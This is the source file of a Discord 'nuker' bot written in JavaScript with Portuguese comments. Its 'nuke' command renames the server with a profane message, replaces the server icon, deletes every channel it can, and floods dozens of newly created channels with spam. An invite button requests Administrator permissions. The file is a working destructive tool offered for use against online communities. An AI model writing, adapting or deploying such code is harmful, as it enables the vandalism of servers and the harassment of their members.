require('dotenv').config();
const fs = require('fs');
const { Client, GatewayIntentBits, PermissionsBitField, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent
  ]
});

const TOKEN = process.env.TOKEN;
const PREFIX = 'P.';
let blacklist = [];

// Função para carregar a blacklist de um arquivo JSON
function loadBlacklist() {
  try {
    if (!fs.existsSync('./blacklist.json')) {
      console.log('🛑 Arquivo blacklist.json não encontrado. Criando um novo...');
      fs.writeFileSync('./blacklist.json', JSON.stringify({ blacklist: [] }, null, 2));
    }

    const data = fs.readFileSync('./blacklist.json', 'utf8');
    const parsedData = JSON.parse(data);

    if (!parsedData.blacklist || !Array.isArray(parsedData.blacklist)) {
      console.log('⚠️ Arquivo blacklist.json corrompido. Resetando...');
      blacklist = [];
      saveBlacklist();
    } else {
      blacklist = parsedData.blacklist;
    }
  } catch (err) {
    console.error('❌ Erro ao carregar a blacklist:', err);
    blacklist = [];
  }
}

// Função para salvar a blacklist
function saveBlacklist() {
  fs.writeFileSync('./blacklist.json', JSON.stringify({ blacklist }, null, 2));
}

// Função para carregar o banner do terminal (AGORA EM VERMELHO)
function loadBanner() {
  try {
    const banner = fs.readFileSync('./Config/banner.txt', 'utf8');
    return `\x1b[31m${banner}\x1b[0m`; // \x1b[31m = Vermelho
  } catch (err) {
    console.error('❌ Erro ao carregar o banner:', err);
    return '\x1b[31m✅ Bot online!\x1b[0m';
  }
}

// Função para carregar a mensagem de envio
function loadMessage() {
  try {
    return fs.readFileSync('./Config/mensagem.txt', 'utf8');
  } catch (err) {
    console.error('❌ Erro ao carregar a mensagem de envio:', err);
    return '🚀 **Nuke ativado!**';
  }
}

client.once('ready', () => {
  loadBlacklist();
  console.log(loadBanner());
});

client.on('messageCreate', async (message) => {
  if (message.author.bot) return;

  // Bloquear todos os comandos para usuários na blacklist
  if (blacklist.includes(message.author.id)) {
    return message.reply('❌ Você está na blacklist e não pode interagir com o bot.');
  }

  if (!message.content.startsWith(PREFIX)) return;
  const args = message.content.slice(PREFIX.length).trim().split(/ +/);
  const command = args.shift().toLowerCase();

  // **Comando de Nuke**
  if (command === 'nuke') {
    if (!message.guild) return;
    if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
      return message.reply('❌ Você não tem permissão para usar este comando.');
    }

    const guild = message.guild;

    try {
      // **1️⃣ Trocar o nome e a foto do servidor**
      await guild.setName('Server Fuck By Pakistan');
      console.log('✅ Nome do servidor alterado.');

      // Substitua com a URL da imagem desejada
      const newAvatar = 'https://imgur.com/a/ktY575N';
      await guild.setIcon(newAvatar);
      console.log('✅ Foto do servidor alterada.');

      // **2️⃣ Apagar todos os canais possíveis**
      await Promise.all(
        guild.channels.cache.map(async (channel) => {
          try {
            await channel.delete();
            console.log(`✅ Canal '${channel.name}' apagado.`);
          } catch (error) {
            console.log(`❌ Erro ao apagar '${channel.name}', spammando nele...`);
            for (let j = 0; j < 5; j++) {
              channel.send(loadMessage()).catch(() => {});
            }
          }
        })
      );

      // **3️⃣ Criar e spammar em novos canais**
      for (let i = 0; i < 30; i++) {
        try {
          const newChannel = await guild.channels.create({
            name: `pakistam own`,
            type: 0
          });

          for (let j = 0; j < 100; j++) {
            newChannel.send(loadMessage()).catch(() => {});
          }

          console.log(`✅ Canal '${newChannel.name}' criado.`);
        } catch (err) {
          console.error('❌ Erro ao criar canal:', err);
        }
      }

      await message.reply('💥 **Nuke finalizado!** Tudo foi apagado ou recebeu spam.');
    } catch (error) {
      console.error('❌ Erro ao executar nuke:', error);
    }
  }

  // **Comando de Blacklist**
  if (command === 'blacklist') {
    if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
      return message.reply('❌ Você não tem permissão para usar este comando.');
    }

    const target = message.mentions.users.first();
    if (!target) {
      return message.reply('❌ Mencione um usuário para adicionar à blacklist.');
    }

    if (blacklist.includes(target.id)) {
      return message.reply('❌ Este usuário já está na blacklist.');
    }

    blacklist.push(target.id);
    saveBlacklist();
    message.reply(`✅ O usuário ${target.tag} foi adicionado à blacklist.`);
  }

  // **Comando de Invite**
  if (command === 'invite') {
    const inviteButton = new ActionRowBuilder().addComponents(
      new ButtonBuilder()
        .setLabel('Adicionar o bot')
        .setURL('https://discord.com/oauth2/authorize?client_id=1354589154394116318&permissions=8&integration_type=0&scope=bot+applications.commands')
        .setStyle(ButtonStyle.Link)
    );

    const embed = new EmbedBuilder()
      .setTitle('Bot Nuker by 1nstagram')
      .setDescription('Clique no botão abaixo para adicionar o bot ao seu servidor.')
      .setColor(0x3498db) // Azul em formato hexadecimal
      .setFooter({ text: 'Nuker', iconURL: client.user.displayAvatarURL() });

    message.reply({ embeds: [embed], components: [inviteButton] });
  }
});

client.login(TOKEN);
